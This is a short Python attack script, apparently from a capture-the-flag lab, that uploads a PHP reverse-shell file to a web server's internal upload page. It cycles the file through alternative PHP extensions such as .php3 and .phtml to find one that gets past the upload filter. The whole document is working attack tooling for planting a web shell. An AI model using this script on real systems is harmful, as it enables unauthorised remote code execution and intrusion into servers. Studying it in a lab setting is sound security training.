#! /usr/bin/env python3
import requests
import os

ip = "10.10.155.48"  # change this to your IP
url = f"http://{ip}:3333/internal/index.php"

old_filename = "php-revshell.php"  # change this to your file name
filename = "php-revshell"  # change this to your file name
extensions = [".php", ".php3", ".php4", ".php5", ".phtml"]

for ext in extensions:
    new_filename = filename + ext
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)

    if "Extensions not allowed" in r.text:
        print(f"{ext} not allowed")
    else:
        print(f"{ext} allowed")

    old_filename = new_filename
